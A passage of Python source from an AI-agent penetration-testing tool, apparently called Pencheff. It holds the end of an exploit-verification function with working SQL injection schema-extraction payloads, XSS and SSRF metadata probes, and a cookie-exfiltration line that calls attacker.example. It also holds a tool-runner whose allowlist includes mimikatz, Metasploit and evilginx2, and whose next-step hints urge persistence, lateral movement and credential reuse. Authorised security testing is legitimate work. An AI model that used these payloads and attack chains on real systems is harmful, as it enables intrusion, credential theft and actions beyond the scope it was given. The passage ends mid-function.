            resp, hdrs = await _fetch_headers(endpoint)
            xfo = hdrs.get("x-frame-options")
            csp = hdrs.get("content-security-policy", "")
            if xfo or "frame-ancestors" in csp.lower():
                confirmed = False
                desc = (
                    f"Frame protection IS present (x-frame-options={xfo!r}, "
                    f"csp frame-ancestors directive present={'frame-ancestors' in csp.lower()}). "
                    f"Original finding cannot be reproduced — marking false_positive."
                )
            else:
                confirmed = True
                poc_html = (
                    f"<!DOCTYPE html><html><body>"
                    f'<h1>Clickjacking PoC for {endpoint}</h1>'
                    f'<iframe src="{endpoint}" width="800" height="600"></iframe>'
                    f"</body></html>"
                )
                desc = (
                    f"Confirmed clickjacking-vulnerable. Live response has no "
                    f"X-Frame-Options header and no `frame-ancestors` CSP directive, "
                    f"so any attacker-controlled origin can frame {endpoint} and "
                    f"overlay invisible UI to trick a logged-in user into clicking. "
                    f"PoC HTML: {poc_html}"
                )
                exploit_result["poc_html"] = poc_html
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(resp, "status_code", None),
                response_headers={k: hdrs[k] for k in ("x-frame-options", "content-security-policy") if k in hdrs},
                body_snippet=None,
            )
            exploit_result["captured_headers"] = {
                k: hdrs.get(k) for k in ("x-frame-options", "content-security-policy")
            }

        # ── Missing X-Content-Type-Options (MIME sniffing) ──────────────────
        elif "x-content-type-options" in title:
            resp, hdrs = await _fetch_headers(endpoint)
            xcto = hdrs.get("x-content-type-options")
            if xcto and xcto.lower() == "nosniff":
                confirmed = False
                desc = (
                    f"x-content-type-options IS set to {xcto!r} — finding cannot be "
                    f"reproduced. Marking false_positive."
                )
            else:
                confirmed = True
                desc = (
                    f"Header absent. Browsers will MIME-sniff responses, so a "
                    f"file uploaded as text/plain but containing <script> can be "
                    f"executed as JS. Stored-XSS-via-upload becomes feasible "
                    f"wherever the app reflects user-provided files. Confirmed by "
                    f"live GET {endpoint} returning no x-content-type-options."
                )
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(resp, "status_code", None),
                response_headers={"x-content-type-options": xcto or "(absent)"},
            )

        # ── Missing CSP ─────────────────────────────────────────────────────
        elif "content-security-policy" in title or "csp" in title:
            resp, hdrs = await _fetch_headers(endpoint)
            csp = hdrs.get("content-security-policy")
            if csp:
                confirmed = False
                desc = (
                    f"CSP IS set: {csp!r}. Header is present — marking false_positive."
                )
            else:
                confirmed = True
                desc = (
                    f"No Content-Security-Policy header on {endpoint}. Any reflected "
                    f"or stored XSS sink in the app will execute inline scripts and "
                    f"connect to arbitrary origins for exfiltration. PoC payload "
                    f"that would land if a sink exists: "
                    f"`<script>fetch('https://attacker.example/?c='+document.cookie)</script>`. "
                    f"Cookie exfiltration succeeds with no CSP backstop."
                )
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(resp, "status_code", None),
                response_headers={"content-security-policy": csp or "(absent)"},
            )

        # ── Missing referrer-policy / permissions-policy ────────────────────
        elif "referrer-policy" in title or "permissions-policy" in title:
            header_name = "referrer-policy" if "referrer-policy" in title else "permissions-policy"
            resp, hdrs = await _fetch_headers(endpoint)
            val = hdrs.get(header_name)
            if val:
                confirmed = False
                desc = f"{header_name} IS set: {val!r}. Marking false_positive."
            else:
                confirmed = True
                enabling = (
                    "Sensitive paths leak in the Referer header to outbound links."
                    if header_name == "referrer-policy"
                    else "Browser feature surface (camera, mic, geolocation, payment, USB) is unrestricted; "
                         "embedded third-party content can access any of these without policy block."
                )
                desc = (
                    f"{header_name} absent on {endpoint}. Defense-in-depth gap: {enabling}"
                )
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(resp, "status_code", None),
                response_headers={header_name: val or "(absent)"},
            )

        # ── Info disclosure: Server / X-Powered-By / version banners ────────
        elif "technology disclosure" in title or "informational header" in title \
                or "x-powered-by" in title or "server" in title and category == "misconfiguration":
            resp, hdrs = await _fetch_headers(endpoint)
            captured = {
                k: hdrs[k]
                for k in ("server", "x-powered-by", "x-aspnet-version", "x-runtime", "via", "x-generator")
                if k in hdrs
            }
            if captured:
                confirmed = True
                desc = (
                    f"Technology disclosure confirmed on {endpoint}. Captured "
                    f"version-revealing headers: {captured}. An attacker uses this "
                    f"to pinpoint specific CVE applicability against the stack."
                )
            else:
                confirmed = False
                desc = (
                    f"No version-revealing headers in live response. Finding cannot "
                    f"be reproduced — marking false_positive."
                )
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(resp, "status_code", None),
                response_headers=captured,
            )

        # ── Missing rate limiting — burst the endpoint ──────────────────────
        elif "rate limit" in title or "rate-limit" in title:
            import time
            BURST_N = 20
            sent: list[int] = []
            t0 = time.monotonic()
            for _ in range(BURST_N):
                try:
                    r = await http.request("GET", endpoint, module="exploit_finding")
                    sent.append(getattr(r, "status_code", 0))
                except Exception:
                    sent.append(0)
            elapsed = time.monotonic() - t0
            n_throttled = sum(1 for s in sent if s in (429, 503))
            if n_throttled >= 1:
                confirmed = False
                desc = (
                    f"{BURST_N} requests in {elapsed:.2f}s saw {n_throttled} "
                    f"throttle responses (HTTP 429/503). Rate limiting IS in place "
                    f"— marking false_positive."
                )
            else:
                confirmed = True
                rate = BURST_N / max(elapsed, 0.001)
                desc = (
                    f"Sent {BURST_N} requests to {endpoint} in {elapsed:.2f}s "
                    f"({rate:.1f} req/s). Zero throttling responses; all returned "
                    f"{set(sent)}. Credential-stuffing / password-spray feasible — "
                    f"an attacker can mount unbounded brute-force at this endpoint."
                )
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=sent[-1] if sent else None,
                response_headers={"x-pencheff-burst-summary": f"{BURST_N} reqs / {elapsed:.2f}s / codes={set(sent)}"},
            )
            exploit_result["burst_summary"] = {"n": BURST_N, "elapsed_sec": elapsed, "status_codes": sent}

        # ── DNS findings (SPF / DMARC) ──────────────────────────────────────
        elif "spf" in title or "dmarc" in title:
            import asyncio
            import shutil
            record_type = "SPF (TXT)" if "spf" in title else "DMARC (TXT at _dmarc subdomain)"
            domain = endpoint  # findings store the bare domain here
            lookup_target = f"_dmarc.{domain}" if "dmarc" in title else domain
            dig_bin = shutil.which("dig")
            dig_out = ""
            if dig_bin:
                proc = await asyncio.create_subprocess_exec(
                    dig_bin, "+short", "TXT", lookup_target,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                dig_out = stdout.decode("utf-8", "replace").strip()
            if "spf" in title:
                has_record = "v=spf1" in dig_out
            else:
                has_record = "v=dmarc1" in dig_out.lower()
            if has_record:
                confirmed = False
                desc = (
                    f"{record_type} record IS present for {lookup_target}: "
                    f"{dig_out!r}. Marking false_positive."
                )
            else:
                confirmed = True
                desc = (
                    f"No {record_type} record found for {lookup_target} (dig output: "
                    f"{dig_out!r}). Email-spoofing protection is missing — an attacker "
                    f"can forge mail From: {domain}. Sender-side defenses are required."
                )
            _append_evidence(
                method="DNS-TXT",
                url=lookup_target,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=None,
                response_headers={"dig_output": dig_out or "(empty)"},
            )

        # ── SQL injection — detect, then enumerate schema ──────────────────
        elif "sql injection" in title or "sqli" in title or category == "sql_injection":
            import re as _re
            detection_payloads = ["' OR '1'='1", "1' OR '1'='1' --", "1' AND SLEEP(3)--"]
            url_template = endpoint if "PENCHEFF" in endpoint else (
                f"{endpoint}{'&' if '?' in endpoint else '?'}q=PENCHEFF"
            )
            captured_responses: list[dict] = []
            for p in detection_payloads:
                test_url = url_template.replace("PENCHEFF", p)
                try:
                    r = await http.request("GET", test_url, module="exploit_finding")
                    captured_responses.append({
                        "payload": p,
                        "status": getattr(r, "status_code", 0),
                        "body_len": len(getattr(r, "content", "") or b""),
                        "body_snip": (getattr(r, "text", "") or "")[:200],
                    })
                except Exception as exc:
                    captured_responses.append({"payload": p, "error": f"{type(exc).__name__}: {exc}"})

            err_markers = ("sql syntax", "sqlite", "psql", "ora-", "mysql", "odbc",
                           "unclosed quotation", "syntaxerror at or near")
            sqli_signal = any(
                any(m in (r.get("body_snip") or "").lower() for m in err_markers)
                for r in captured_responses
            )

            # Schema-enumeration follow-up. Only runs when detection succeeds.
            # Sends error-based payloads tuned for MySQL/Postgres/MSSQL and
            # greps the response bodies for the leaked text. Best-effort: a
            # modern WAF or generic 500 page defeats this; when it lands, the
            # report shows the live database name, version, and up to 20
            # tables visible to the injected query's effective role.
            extracted_schema: dict[str, Any] = {
                "database_name": None, "version": None,
                "tables": [], "extraction_notes": [],
            }
            # XPath-error sentinel: 0x7e is "~". Pulled values appear between ~~.
            _XPATH_RE = _re.compile(r"~([A-Za-z0-9_.\-+/ ]{1,200})~")
            # Postgres cast-to-int error: "...invalid input syntax for type integer: \"VALUE\""
            _PG_CAST_RE = _re.compile(r'invalid input syntax[^"]*"([^"]{1,200})"')
            # MSSQL convert error: "Conversion failed when converting ... value 'VALUE' to data type int"
            _MSSQL_RE = _re.compile(r"value '([^']{1,200})' to data type", _re.IGNORECASE)

            def _extract_value(body: str) -> str | None:
                for rgx in (_XPATH_RE, _PG_CAST_RE, _MSSQL_RE):
                    m = rgx.search(body or "")
                    if m:
                        return m.group(1).strip()
                return None

            async def _send(payload: str) -> str:
                test_url = url_template.replace("PENCHEFF", payload)
                try:
                    rr = await http.request("GET", test_url, module="exploit_finding")
                    return getattr(rr, "text", "") or ""
                except Exception as _exc:
                    extracted_schema["extraction_notes"].append(
                        f"send error for payload: {type(_exc).__name__}"
                    )
                    return ""

            if sqli_signal:
                # Step 1 — current database name (try MySQL, Postgres, MSSQL forms)
                meta_probes = [
                    # MySQL extractvalue: leaks via XPath-syntax error
                    "' AND extractvalue(rand(),concat(0x7e,(SELECT database()),0x7e))-- ",
                    # Postgres: cast to int triggers an error containing the value
                    "' AND 1=CAST((SELECT current_database()) AS int)-- ",
                    # MSSQL: convert raises an error showing the value
                    "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- ",
                ]
                for p in meta_probes:
                    body = await _send(p)
                    val = _extract_value(body)
                    if val:
                        extracted_schema["database_name"] = val
                        break

                # Step 2 — version string
                ver_probes = [
                    "' AND extractvalue(rand(),concat(0x7e,version(),0x7e))-- ",
                    "' AND 1=CAST(version() AS int)-- ",
                    "' AND 1=CONVERT(int,@@version)-- ",
                ]
                for p in ver_probes:
                    body = await _send(p)
                    val = _extract_value(body)
                    if val:
                        extracted_schema["version"] = val[:200]
                        break

                # Step 3 — iterate table names via information_schema (cap 20)
                if extracted_schema["database_name"]:
                    for offset in range(20):
                        tbl_probes = [
                            # MySQL
                            (
                                f"' AND extractvalue(rand(),concat(0x7e,"
                                f"(SELECT table_name FROM information_schema.tables "
                                f"WHERE table_schema=database() LIMIT {offset},1),0x7e))-- "
                            ),
                            # Postgres
                            (
                                f"' AND 1=CAST((SELECT table_name FROM information_schema.tables "
                                f"WHERE table_schema='public' ORDER BY table_name "
                                f"LIMIT 1 OFFSET {offset}) AS int)-- "
                            ),
                        ]
                        got = None
                        for p in tbl_probes:
                            body = await _send(p)
                            val = _extract_value(body)
                            if val and val not in extracted_schema["tables"]:
                                got = val
                                break
                        if got is None:
                            break
                        extracted_schema["tables"].append(got)

            if sqli_signal:
                confirmed = True
                if extracted_schema["database_name"] or extracted_schema["tables"]:
                    desc = (
                        f"SQL injection confirmed AND exploited at {endpoint}. "
                        f"Extracted via error-based payloads: "
                        f"database={extracted_schema['database_name']!r}, "
                        f"version={extracted_schema['version']!r}, "
                        f"tables({len(extracted_schema['tables'])})="
                        f"{extracted_schema['tables'][:20]}. An attacker with "
                        f"this sink can enumerate the full schema and (with "
                        f"additional UNION-based queries) dump table contents."
                    )
                else:
                    desc = (
                        f"SQL injection confirmed at {endpoint} (DB error markers "
                        f"reflected in responses) but error-based schema extraction "
                        f"did not parse a leaked value — the app may sanitise error "
                        f"output. Recommend running sqlmap against this endpoint "
                        f"for deeper extraction. Captured: {captured_responses}"
                    )
            else:
                confirmed = False
                desc = (
                    f"No SQL error markers in probe responses for {endpoint}. "
                    f"Captured: {captured_responses}. Marking false_positive."
                )

            _append_evidence(
                method="GET", url=url_template,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=captured_responses[-1].get("status") if captured_responses else None,
                body_snippet=str(captured_responses)[:1500],
            )
            exploit_result["probe_results"] = captured_responses
            exploit_result["extracted_schema"] = extracted_schema

        # ── XSS — try a benign alert(1) reflection probe ────────────────────
        elif "xss" in title or "cross-site scripting" in title or category == "xss":
            probe = "<svg/onload=alert(1)>__PCFF__"
            url_template = endpoint if "PENCHEFF" in endpoint else (
                f"{endpoint}{'&' if '?' in endpoint else '?'}q=PENCHEFF"
            )
            test_url = url_template.replace("PENCHEFF", probe)
            try:
                r = await http.request("GET", test_url, module="exploit_finding")
                body = (getattr(r, "text", "") or "")
            except Exception as exc:
                r, body = None, f"<error: {exc}>"
            reflected = probe in body or "<svg/onload=alert(1)>" in body
            if reflected:
                confirmed = True
                desc = (
                    f"XSS reflection confirmed at {endpoint}. Probe payload "
                    f"`{probe}` reflected verbatim in the response body. Cookie "
                    f"exfil via `document.cookie` becomes feasible."
                )
            else:
                confirmed = False
                desc = (
                    f"Probe payload `{probe}` did not appear in response body — "
                    f"likely escaped or unreflected. Marking false_positive."
                )
            _append_evidence(
                method="GET", url=test_url,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(r, "status_code", None) if r else None,
                body_snippet=body[:800],
            )

        # ── SSRF — try a benign OOB / cloud-metadata probe ──────────────────
        elif "ssrf" in title or "server-side request forgery" in title or category == "ssrf":
            # Two benign probes: localhost (should be blocked) + cloud metadata IP.
            probes = ["http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/"]
            results: list[dict] = []
            for p in probes:
                test_url = (endpoint if "PENCHEFF" in endpoint else f"{endpoint}?url=PENCHEFF").replace("PENCHEFF", p)
                try:
                    r = await http.request("GET", test_url, module="exploit_finding")
                    results.append({
                        "probe": p,
                        "status": getattr(r, "status_code", 0),
                        "body_snip": (getattr(r, "text", "") or "")[:300],
                    })
                except Exception as exc:
                    results.append({"probe": p, "error": str(exc)})
            # SSRF signal: 2xx response to a localhost probe, or AWS-metadata-shaped body.
            signal = any(
                (200 <= (r.get("status") or 0) < 300)
                or ("iam" in (r.get("body_snip") or "").lower())
                for r in results
            )
            if signal:
                confirmed = True
                desc = (
                    f"SSRF confirmed at {endpoint}. Probes returned: {results}. "
                    f"Cloud metadata service may be reachable — credential theft "
                    f"chain possible."
                )
            else:
                confirmed = False
                desc = (
                    f"SSRF probes blocked / no signal: {results}. Marking false_positive."
                )
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=results[-1].get("status") if results else None,
                body_snippet=str(results)[:1500],
            )

        # ── Generic fallback — re-fetch endpoint, capture response ──────────
        else:
            resp, hdrs = await _fetch_headers(endpoint)
            confirmed = True  # the response itself is the evidence
            desc = (
                f"Generic re-probe of {endpoint} for finding '{target_finding.title}'. "
                f"Captured live response status={getattr(resp, 'status_code', None)} for "
                f"audit. No category-specific exploitation playbook matched this finding; "
                f"agent should follow up with a custom test_endpoint payload if applicable."
            )
            body_text = (getattr(resp, "text", "") or "")[:800]
            _append_evidence(
                method="GET", url=endpoint,
                description=desc[:EVIDENCE_DESC_MAX],
                response_status=getattr(resp, "status_code", None),
                response_headers={k: v for k, v in hdrs.items() if k in ("server", "x-powered-by", "content-type")},
                body_snippet=body_text,
            )

    except Exception as exc:
        # Don't crash the agent loop on a malformed playbook input.
        target_finding.evidence.append(Evidence(
            request_method="exploit_finding",
            request_url=endpoint,
            description=(
                f"Exploitation attempt errored: {type(exc).__name__}: {exc}. "
                f"Finding kept at current verification_status."
            )[:EVIDENCE_DESC_MAX],
        ))
        return {
            "finding_id": finding_id,
            "title": target_finding.title,
            "exploit_succeeded": False,
            "error": f"{type(exc).__name__}: {exc}",
        }

    # Stamp verification_status based on whether exploit reproduced.
    target_finding.verification_status = (
        VerificationStatus.TRUE_POSITIVE if confirmed else VerificationStatus.FALSE_POSITIVE
    )

    return {
        "finding_id": finding_id,
        "title": target_finding.title,
        "category": target_finding.category,
        "endpoint": target_finding.endpoint,
        "exploit_succeeded": confirmed,
        "verification_status": target_finding.verification_status.value,
        "evidence_count": len(target_finding.evidence),
        "latest_evidence": target_finding.evidence[-1].to_dict() if target_finding.evidence else None,
        **exploit_result,
    }


@mcp.tool()
async def run_security_tool(
    session_id: str,
    tool: str,
    args: list[str],
    timeout: int = 120,
    parse_output: bool = True,
) -> dict[str, Any]:
    """Execute an auxiliary external security tool (hydra, ffuf,
    gobuster, wfuzz, subfinder, dirb, whatweb, wafw00f, sslscan, testssl, masscan,
    amass, fierce, dnsrecon, theHarvester, etc.) with safe subprocess execution.

    Examples:
      run_security_tool(sid, "hydra", ["-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt", "target.com", "http-post-form", "/login:user=^USER^&pass=^PASS^:F=incorrect"])
      run_security_tool(sid, "ffuf", ["-u", "https://target.com/FUZZ", "-w", "/usr/share/wordlists/dirb/common.txt"])
      run_security_tool(sid, "gobuster", ["dir", "-u", "https://target.com", "-w", "/usr/share/wordlists/dirb/common.txt"])
      run_security_tool(sid, "wfuzz", ["-c", "-z", "file,/usr/share/wordlists/dirb/common.txt", "https://target.com/FUZZ"])
      run_security_tool(sid, "sslscan", ["target.com"])
      run_security_tool(sid, "whatweb", ["https://target.com"])
      run_security_tool(sid, "wafw00f", ["https://target.com"])
      run_security_tool(sid, "dirb", ["https://target.com"])
      run_security_tool(sid, "subfinder", ["-d", "target.com"])
      run_security_tool(sid, "amass", ["enum", "-d", "target.com"])
      run_security_tool(sid, "dnsrecon", ["-d", "target.com"])
      run_security_tool(sid, "fierce", ["--domain", "target.com"])
      run_security_tool(sid, "john", ["--wordlist=/usr/share/wordlists/rockyou.txt", "hashes.txt"])
      run_security_tool(sid, "hashcat", ["-m", "0", "hashes.txt", "/usr/share/wordlists/rockyou.txt"])
      run_security_tool(sid, "wpscan", ["--url", "https://target.com"])
      run_security_tool(sid, "masscan", ["-p1-65535", "target.com", "--rate=1000"])
      run_security_tool(sid, "testssl", ["https://target.com"])

    The tool must be installed on the system. Use check_dependencies to see available tools.
    Output is captured and returned (truncated to 50KB). Use this for REAL exploitation and
    deep scanning — core port mapping, SQLi checks, web exposure checks, and template detection use Pencheff first-party engines."""
    session = _require_session(session_id)

    from pencheff.core.tool_runner import tool_available, run_tool

    # Security: only allow known security tools (no arbitrary command execution)
    ALLOWED_TOOLS = {
        # ── Network Scanning Tools ──
        "ipscan",               # Angry IP Scanner CLI
        "fping",                # Fast ICMP ping to multiple hosts
        "unicornscan",          # Asynchronous TCP/UDP scanner
        "netcat", "nc", "ncat", # Network utility — scanning, file transfer, shells
        "masscan",              # Ultra-fast port scanner
        "naabu",                # Fast port scanner (ProjectDiscovery)
        "nessus", "nessusd",    # Vulnerability scanner (Tenable)
        # ── Vulnerability Scanning Tools ──
        "openvas", "gvm-cli",   # Open Vulnerability Assessment Scanner
        # ── Password Cracking Tools ──
        "john",                 # John the Ripper — password cracker
        "hashcat",              # GPU-accelerated password recovery
        "rcrack",               # RainbowCrack — rainbow table cracker
        "aircrack-ng",          # WiFi WEP/WPA/WPA2 cracking suite
        "hydra",                # Network login brute-forcer (50+ protocols)
        "medusa",               # Parallel network login brute-forcer
        "l0phtcrack",           # Password auditing and recovery
        "cowpatty",             # WPA2-PSK brute-force cracking
        # ── Exploitation Tools ──
        "msfconsole",           # Metasploit Framework console
        "msfvenom",             # Metasploit payload generator
        "msfdb",                # Metasploit database management
        "setoolkit",            # Social-Engineer Toolkit
        "beef-xss", "beef",     # Browser Exploitation Framework
        "armitage",             # Graphical cyber attack management (Metasploit)
        "zap-cli", "zaproxy",   # OWASP ZAP CLI / proxy
        # ── Packet Sniffing & Spoofing Tools ──
        "wireshark",            # Network protocol analyzer (GUI)
        "tshark",               # Wireshark CLI — deep packet inspection
        "tcpdump",              # Command-line packet analyzer
        "ettercap",             # Man-in-the-middle attack suite
        "bettercap",            # Network attack Swiss Army knife
        "snort",                # Intrusion detection/prevention system
        "ngrep",                # Network grep — pattern-matching packet analyzer
        "hping3",               # Packet crafting and analysis
        "nemesis",              # Packet crafting and injection
        # ── Wireless Hacking Tools ──
        "wifite",               # Automated wireless auditing
        "kismet",               # Wireless detector, sniffer, and IDS
        "reaver",               # WPS brute-force attack
        "bully",                # WPS brute-force (C-based, fast)
        "wifiphisher",          # Rogue AP framework for WiFi phishing
        # ── Directory / Path Brute Force ──
        "gobuster",             # Directory/DNS/vhost brute-force
        "ffuf",                 # Fast web fuzzer
        "dirb",                 # Web content scanner
        "wfuzz",                # Web fuzzer — headers, POST, URLs, auth
        "dirsearch",            # Web path brute-forcer
        "feroxbuster",          # Recursive content discovery
        # ── Web Application Hacking Tools ──
        "skipfish",             # Web app security reconnaissance
        "whatweb",              # Web technology fingerprinting
        "wafw00f",              # WAF fingerprinting and detection
        "wpscan",               # WordPress vulnerability scanner
        # ── Subdomain Enumeration ──
        "subfinder",            # Passive subdomain discovery (ProjectDiscovery)
        "amass",                # OWASP attack surface mapping
        "fierce",               # DNS reconnaissance and brute-forcing
        "dnsrecon",             # DNS enumeration — zone transfers, brute force
        "sublist3r",            # Subdomain enumeration via search engines
        "knockpy",              # Subdomain scanner with DNS resolution
        "dnsenum",              # DNS enumeration tool
        # ── DNS Tools ──
        "dig",                  # DNS lookups
        "whois",                # Domain registration info
        "host",                 # DNS lookup utility
        # ── SSL/TLS Testing ──
        "sslscan",              # SSL/TLS scanner — ciphers, protocols, certs
        "testssl", "testssl.sh",# Comprehensive SSL/TLS testing
        "sslyze",               # Fast SSL/TLS scanner (Python)
        "openssl",              # SSL/TLS cryptography toolkit
        # ── XSS Scanning ──
        "dalfox",               # XSS scanner with DOM analysis
        "xsstrike",             # Advanced XSS detection
        # ── OSINT / Social Engineering ──
        "theHarvester",         # OSINT — emails, subdomains, IPs
        "maltego",              # OSINT and link analysis
        "recon-ng",             # Web reconnaissance framework
        "sherlock",             # Username enumeration across social networks
        "spiderfoot",           # Automated OSINT collection
        "gophish",              # Phishing campaign toolkit
        "king-phisher",         # Phishing simulation toolkit
        "evilginx2", "evilginx",# MitM attack framework (2FA bypass)
        # ── Forensic Tools ──
        "autopsy",              # Digital forensics platform
        "foremost",             # File recovery/carving for forensics
        "scalpel",              # Fast file carver (forensics)
        "fls", "mmls", "icat",  # The Sleuth Kit — disk image investigation
        "volatility", "vol",    # Memory forensics framework
        "binwalk",              # Firmware analysis and extraction
        # ── Post-Exploitation / Credential Tools ──
        "mimikatz",             # Windows credential extraction
        "crackmapexec", "cme",  # Post-exploitation — SMB, LDAP, WinRM, MSSQL
        "impacket-secretsdump", # Impacket — credential dumping
        "impacket-psexec",      # Impacket — remote execution
        "impacket-smbexec",     # Impacket — SMB execution
        "impacket-wmiexec",     # Impacket — WMI execution
        "responder",            # LLMNR/NBT-NS/MDNS poisoner
        "enum4linux",           # SMB/Windows enumeration
        "smbclient",            # SMB client for file share access
        "pcredz",               # Credential extraction from PCAP files
        # ── Web Proxy / API Testing ──
        "curl",                 # HTTP requests
        "wget",                 # HTTP downloader
        "httpx-toolkit",        # HTTP probing (ProjectDiscovery)
        # ── Misc ──
        "interactsh-client",    # Out-of-band callback detection
        "gau",                  # URL discovery from web archives
        "waybackurls",          # Fetch URLs from Wayback Machine
        "semgrep",              # Static analysis (5000+ rules)
        "bandit",               # Python security analysis
        "trufflehog",           # Secret scanning in git repos
        "gittools", "git-dumper", # Git repository extraction
        # ── SCA / SBOM / IaC / Container ──
        "syft",                 # SBOM generator (SPDX + CycloneDX)
        "grype",                # Vulnerability scanner for SBOMs / container images
        "trivy",                # All-in-one vuln + misconfig + secret scanner
        "checkov",              # IaC policy-as-code (Terraform, K8s, CloudFormation, ARM)
        "hadolint",             # Dockerfile linter
        "tfsec",                # Terraform security scanner
        "kubesec",              # Kubernetes risk analysis
        "osv-scanner",          # OSV.dev-backed dep scanner
        "cyclonedx-cli",        # CycloneDX SBOM tooling
        "dependency-check",     # OWASP dependency-check
        "helm",                 # Helm template → K8s manifest pipeline
        "mitmdump", "mitmproxy", # Intercepting proxy backend
        "gitleaks",             # Secret scanning (alternative)
        # ── Mobile (static) ──
        "apktool",              # APK decompile (smali + AndroidManifest.xml)
        "jadx",                 # APK → Java source recovery
        "mobsfscan",            # MobSF standalone static analyzer
        "qark",                 # Quick Android Review Kit
        "aapt", "aapt2",        # Android Asset Packaging Tool — manifest dump
        "androguard",           # Python-based APK analysis
        "otool",                # Mach-O object file tool (iOS, macOS-only)
        "class-dump",           # Objective-C interface extraction (iOS, macOS-only)
        "plistutil",            # plist parser (binary <-> xml)
    }

    # Phase-2 expansion: union the orchestrator's tool registry into the
    # allowlist so new wrappers are reachable from MCP without growing this
    # set inline. See pencheff/core/tool_registry.py for what's added.
    from pencheff.core.tool_registry import ALLOWED_TOOLS as _ORCH_ALLOWED
    EFFECTIVE_ALLOWED = ALLOWED_TOOLS | _ORCH_ALLOWED

    if tool not in EFFECTIVE_ALLOWED:
        return {
            "error": f"Tool '{tool}' is not in the allowed security tools list. "
                     f"Allowed: {', '.join(sorted(EFFECTIVE_ALLOWED)[:30])}...",
            "success": False,
        }

    if not tool_available(tool):
        return {
            "error": f"Tool '{tool}' is not installed on this system. "
                     "Install it or use the built-in modules as fallback.",
            "success": False,
            "install_hint": _get_install_hint(tool),
        }

    # Execute the tool
    result = await run_tool([tool] + args, timeout=float(timeout))

    # Log the execution
    session.log_request("TOOL", f"{tool} {' '.join(args[:5])}", None, f"ext:{tool}", 0)

    # Truncate output to prevent massive responses
    stdout = result.stdout[:51200] if result.stdout else ""
    stderr = result.stderr[:10240] if result.stderr else ""

    output = {
        "tool": tool,
        "args": args,
        "success": result.success,
        "exit_code": result.returncode,
        "stdout": stdout,
        "stderr": stderr,
        "next_steps": [],
    }

    # Add contextual next_steps based on tool type
    if result.success:
        if tool == "hydra":
            output["next_steps"] = [
                "If credentials found, use test_endpoint to log in and demonstrate access.",
                "Try the found credentials on other services (SSH, admin panels, APIs).",
            ]
        elif tool in ("ffuf", "gobuster", "dirb", "wfuzz", "feroxbuster"):
            output["next_steps"] = [
                "Check discovered paths with test_endpoint — look for admin panels, config files, backups.",
                "Run scan_injection on newly discovered endpoints with parameters.",
            ]
        elif tool in ("subfinder", "amass", "fierce", "dnsrecon"):
            output["next_steps"] = [
                "Run scan_subdomain_takeover on discovered subdomains.",
                "Test each subdomain for separate vulnerabilities — they often run different software.",
            ]
        elif tool in ("sslscan", "testssl", "sslyze"):
            output["next_steps"] = [
                "Check for weak ciphers, expired certs, and protocol downgrade attacks.",
            ]
        elif tool in ("wafw00f", "whatweb"):
            output["next_steps"] = [
                "Use WAF/tech info to tailor payloads via payload_generate.",
            ]
        elif tool in ("ettercap", "bettercap"):
            output["next_steps"] = [
                "Analyze captured traffic for credentials, session tokens, and API keys.",
                "Use MitM position to inject payloads or modify responses.",
            ]
        elif tool in ("aircrack-ng", "wifite", "reaver", "bully"):
            output["next_steps"] = [
                "If WiFi key cracked, connect to the network and scan internal hosts.",
                "Run recon_active on the internal network to find additional targets.",
            ]
        elif tool == "msfconsole":
            output["next_steps"] = [
                "If exploit succeeded, establish persistence and pivot to internal network.",
                "Use post-exploitation modules to dump credentials and escalate privileges.",
            ]
        elif tool in ("john", "hashcat", "rcrack"):
            output["next_steps"] = [
                "If passwords cracked, use test_endpoint to log in and demonstrate access.",
                "Try cracked passwords on other services — credential reuse is common.",
            ]
        elif tool in ("setoolkit", "gophish", "king-phisher", "evilginx2"):
            output["next_steps"] = [
                "Document captured credentials and session tokens.",
                "Use captured access to demonstrate impact of social engineering.",
            ]
        elif tool in ("foremost", "scalpel", "binwalk", "volatility"):
            output["next_steps"] = [
                "Analyze recovered files for sensitive data, credentials, and artifacts.",
            ]
        elif tool in ("crackmapexec", "enum4linux", "smbclient", "responder"):
            output["next_steps"] = [
                "Use discovered credentials/shares for lateral movement.",
                "Try impacket tools for remote execution on discovered hosts.",
            ]
        elif tool in ("theHarvester", "sherlock", "recon-ng", "spiderfoot", "maltego"):
            output["next_steps"] = [
                "Use discovered emails/users for credential stuffing and social engineering.",
                "Map discovered infrastructure for additional attack surface.",
            ]
        elif tool in ("commix", "xsstrike", "xsser"):
            output["next_steps"] = [
                "Verify exploitation with test_endpoint — build working PoC payloads.",
                "Chain with other findings for maximum impact.",
            ]
        elif tool in ("tshark", "tcpdump", "ngrep"):
            output["next_steps"] = [
                "Analyze captured packets for credentials, tokens, and sensitive data.",
                "Use pcredz to auto-extract credentials from capture files.",
            ]
        elif tool in ("semgrep", "bandit", "trufflehog"):
            output["next_steps"] = [
                "Review findings for hardcoded secrets, unsafe code patterns.",
                "Verify findings lead to actual exploitable vulnerabilities.",
            ]
    else:
        output["next_steps"] = [f"Tool failed (exit {result.returncode}). Check stderr for details."]

    return output


def _get_install_hint(tool: str) -> str:
    """Return installation hints for common security tools."""
    hints = {
        # Network scanning
        "ipscan": "brew install --cask angry-ip-scanner / https://angryip.org/download/",
        "fping": "brew install fping / apt install fping",
        "unicornscan": "apt install unicornscan",
        "masscan": "brew install masscan / apt install masscan",
        "naabu": "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
        "hping3": "brew install hping / apt install hping3",
        # Vulnerability scanning
        "openvas": "apt install openvas / docker pull greenbone/openvas",
        "gvm-cli": "pip install gvm-tools",
